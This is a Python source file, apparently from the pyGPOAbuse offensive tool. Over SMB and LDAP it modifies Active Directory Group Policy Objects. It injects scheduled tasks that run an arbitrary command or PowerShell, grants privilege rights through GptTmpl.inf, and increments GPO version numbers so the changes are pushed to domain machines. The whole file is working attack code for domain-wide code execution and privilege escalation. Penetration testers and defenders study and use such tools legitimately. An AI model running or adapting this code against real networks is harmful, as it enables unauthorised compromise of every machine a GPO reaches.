import asyncio
import logging
import re
from pygpoabuse.scheduledtask import ScheduledTask
from pygpoabuse.ldap import Ldap
from pygpoabuse.userrights import UserRights


class GPO:
    def __init__(self, smb_session):
        self._smb_session = smb_session

    def update_extensionNames(self, extensionName):
        val1 = "00000000-0000-0000-0000-000000000000"
        val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72"
        val3 = "AADCED64-746C-4633-A97C-D61349046527"

        if extensionName is None:
            extensionName = ""

        try:
            if not val2 in extensionName:
                new_values = []
                toUpdate = ''.join(extensionName)
                test = toUpdate.split("[")
                for i in test:
                    new_values.append(i.replace("{", "").replace("}", " ").replace("]", ""))

                if val1 not in toUpdate:
                    new_values.append(val1 + " " + val2)

                elif val1 in toUpdate:
                    for k, v in enumerate(new_values):
                        if val1 in new_values[k]:
                            toSort = []
                            test2 = new_values[k].split()
                            for f in range(1, len(test2)):
                                toSort.append(test2[f])
                            toSort.append(val2)
                            toSort.sort()
                            new_values[k] = test2[0]
                            for val in toSort:
                                new_values[k] += " " + val

                if val3 not in toUpdate:
                    new_values.append(val3 + " " + val2)

                elif val3 in toUpdate:
                    for k, v in enumerate(new_values):
                        if val3 in new_values[k]:
                            toSort = []
                            test2 = new_values[k].split()
                            for f in range(1, len(test2)):
                                toSort.append(test2[f])
                            toSort.append(val2)
                            toSort.sort()
                            new_values[k] = test2[0]
                            for val in toSort:
                                new_values[k] += " " + val

                new_values.sort()

                new_values2 = []
                for i in range(len(new_values)):
                    if new_values[i] is None or new_values[i] == "":
                        continue
                    value1 = new_values[i].split()
                    new_val = ""
                    for q in range(len(value1)):
                        if value1[q] is None or value1[q] == "":
                            continue
                        new_val += "{" + value1[q] + "}"
                    new_val = "[" + new_val + "]"
                    new_values2.append(new_val)

                return "".join(new_values2)
        except:
            return "[{" + val1 + "}{" + val2 + "}]" + "[{" + val3 + "}{" + val2 + "}]"

    async def update_ldap(self, url, domain, gpo_id, gpo_type="computer"):
        ldap = Ldap(url, gpo_id, domain)
        r = await ldap.connect()
        if not r:
            logging.debug("Could not connect to LDAP")
            return False

        version = await ldap.get_attribute("versionNumber")
        
        if gpo_type == "computer":
            attribute_name = "gPCMachineExtensionNames"
            updated_version = version + 1
        else:
            attribute_name = "gPCUserExtensionNames"
            updated_version = version + 65536

        extensionName = await ldap.get_attribute(attribute_name)

        if extensionName == False:
            logging.debug("Could not get {} attribute".format(attribute_name))
            return False

        updated_extensionName = self.update_extensionNames(extensionName)

        logging.debug("New extensionName: {}".format(updated_extensionName))

        await ldap.update_attribute(attribute_name, updated_extensionName, extensionName)
        await ldap.update_attribute("versionNumber", updated_version, version)

        return updated_version

    def update_versions(self, url, domain, gpo_id, gpo_type):
        updated_version = asyncio.run(self.update_ldap(url, domain, gpo_id, gpo_type))

        if not updated_version:
            return False

        logging.debug("Updated version number : {}".format(updated_version))

        try:
            tid = self._smb_session.connectTree("SYSVOL")
            fid = self._smb_session.openFile(tid, domain + "/Policies/{" + gpo_id + "}/gpt.ini")
            content = self._smb_session.readFile(tid, fid)
             # Added by @Deft_ to comply with french active directories (mostly accents)
            try:
                new_content = re.sub('=[0-9]+', '={}'.format(updated_version), content.decode("utf-8"))
            except UnicodeDecodeError:
                new_content = re.sub('=[0-9]+', '={}'.format(updated_version), content.decode("latin-1"))
            self._smb_session.writeFile(tid, fid, new_content)
            self._smb_session.closeFile(tid, fid)
        except:
            logging.error("Unable to update gpt.ini file", exc_info=True)
            return False

        logging.debug("gpt.ini file successfully updated")
        return True

    def _check_or_create(self, base_path, path):
        for dir in path.split("/"):
            base_path += dir + "/"
            try:
                self._smb_session.listPath("SYSVOL", base_path)
                logging.debug("{} exists".format(base_path))
            except:
                try:
                    self._smb_session.createDirectory("SYSVOL", base_path)
                    logging.debug("{} created".format(base_path))
                except:
                    logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                    return False
        return True

    def update_scheduled_task(self, domain, gpo_id, name="", mod_date="", description="", powershell=False, command="", gpo_type="computer", force=False):

        try:
            tid = self._smb_session.connectTree("SYSVOL")
            logging.debug("Connected to SYSVOL")
        except:
            logging.error("Unable to connect to SYSVOL share", exc_info=True)
            return False

        path = domain + "/Policies/{" + gpo_id + "}/"

        try:
            self._smb_session.listPath("SYSVOL", path)
            logging.debug("GPO id {} exists".format(gpo_id))
        except:
            logging.error("GPO id {} does not exist".format(gpo_id), exc_info=True)
            return False

        if gpo_type == "computer":
            root_path = "Machine"
        else:
            root_path = "User"

        if not self._check_or_create(path, "{}/Preferences/ScheduledTasks".format(root_path)):
            return False

        path += "{}/Preferences/ScheduledTasks/ScheduledTasks.xml".format(root_path)

        try:
            fid = self._smb_session.openFile(tid, path)
            st_content = self._smb_session.readFile(tid, fid, singleCall=False).decode("utf-8")
            st = ScheduledTask(gpo_type=gpo_type, name=name, mod_date=mod_date, description=description,
                               powershell=powershell, command=command, old_value=st_content)
            tasks = st.parse_tasks(st_content)

            if not force:
                logging.error("The GPO already includes a ScheduledTasks.xml.")
                logging.error("Use -f to append to ScheduledTasks.xml")
                logging.error("Use -v to display existing tasks")
                logging.warning("C: Create, U: Update, D: Delete, R: Replace")
                for task in tasks:
                    logging.warning("[{}] {} (Type: {})".format(task[0], task[1], task[2]))
                return False

            new_content = st.generate_scheduled_task_xml()
        except Exception as e:
            # File does not exist
            logging.debug("ScheduledTasks.xml does not exist. Creating it...")
            try:
                fid = self._smb_session.createFile(tid, path)
                logging.debug("ScheduledTasks.xml created")
            except:
                logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                return False
            st = ScheduledTask(gpo_type=gpo_type, name=name, mod_date=mod_date, description=description, powershell=powershell, command=command)
            new_content = st.generate_scheduled_task_xml()

        try:
            self._smb_session.writeFile(tid, fid, new_content)
            logging.debug("ScheduledTasks.xml has been saved")
        except:
            logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
            self._smb_session.closeFile(tid, fid)
            return False
        self._smb_session.closeFile(tid, fid)
        return st.get_name()

    def update_user_rights(self, domain, gpo_id, username, sid, rights, force=False):
        """Add user rights to a GPO

        Args:
            domain: Domain name
            gpo_id: ID of the GPO to modify
            username: Username to assign rights to
            sid: SID of the user
            rights: Comma-separated list of rights to assign
            force: Force update if GptTmpl.inf already exists

        Returns:
            bool: True if successful, False otherwise
        """
        try:
            tid = self._smb_session.connectTree("SYSVOL")
            logging.debug("Connected to SYSVOL")
        except:
            logging.error("Unable to connect to SYSVOL share", exc_info=True)
            return False

        path = domain + "/Policies/{" + gpo_id + "}/"

        try:
            self._smb_session.listPath("SYSVOL", path)
            logging.debug("GPO id {} exists".format(gpo_id))
        except:
            logging.error("GPO id {} does not exist".format(gpo_id), exc_info=True)
            return False

        # User rights can only be applied to Machine policy
        root_path = "Machine"
        secedit_path = "{}/Microsoft/Windows NT/SecEdit".format(root_path)

        if not self._check_or_create(path, secedit_path):
            return False

        user_rights = UserRights(username, sid, rights)
        is_valid, invalid_rights = user_rights.validate_rights()
        
        if not is_valid:
            logging.error("Invalid rights specified: {}".format(", ".join(invalid_rights)))
            return False

        inf_path = path + "{}/Microsoft/Windows NT/SecEdit/GptTmpl.inf".format(root_path)

        try:
            fid = self._smb_session.openFile(tid, inf_path)
            inf_content = self._smb_session.readFile(tid, fid, singleCall=False).decode("utf-8")
            
            # Check if the file already contains user rights
            if "[Privilege Rights]" in inf_content and not force:
                logging.error("The GPO already includes user rights in GptTmpl.inf.")
                logging.error("Use -f to override the existing settings")
                self._smb_session.closeFile(tid, fid)
                return False
            
            # Close the existing file before proceeding
            self._smb_session.closeFile(tid, fid)
            
            # If force is true, or there's no user rights section, create/update the file
            if force or "[Privilege Rights]" not in inf_content:
                if "[Privilege Rights]" not in inf_content:
                    # No rights section exists, append it
                    logging.debug("No user rights section exists in the file, adding it")
                    
                    # Remove the existing section markers if they exist
                    sections = ["[Unicode]", "[Version]", "[Privilege Rights]"]
                    clean_content = inf_content
                    for section in sections:
                        clean_content = clean_content.replace(section, "")
                    
                    # Generate new content with the user rights
                    new_content = user_rights.generate_inf_file_content()
                    
                    # Add any other content that might have been in the file
                    if clean_content.strip():
                        new_content += clean_content
                else:
                    # Rights section exists, but we're forcing the update
                    logging.debug("User rights section exists, forcing update")
                    new_content = user_rights.generate_inf_file_content()
                
                # Open the file for writing
                fid = self._smb_session.createFile(tid, inf_path)
                self._smb_session.writeFile(tid, fid, new_content)
                self._smb_session.closeFile(tid, fid)
                return True
        
        except Exception as e:
            # File does not exist, create it
            logging.debug("GptTmpl.inf does not exist. Creating it...")
            try:
                fid = self._smb_session.createFile(tid, inf_path)
                logging.debug("GptTmpl.inf created")
                
                # Generate and write the inf file content
                new_content = user_rights.generate_inf_file_content()
                self._smb_session.writeFile(tid, fid, new_content)
                self._smb_session.closeFile(tid, fid)
                return True
            except:
                logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                return False
        
        return False
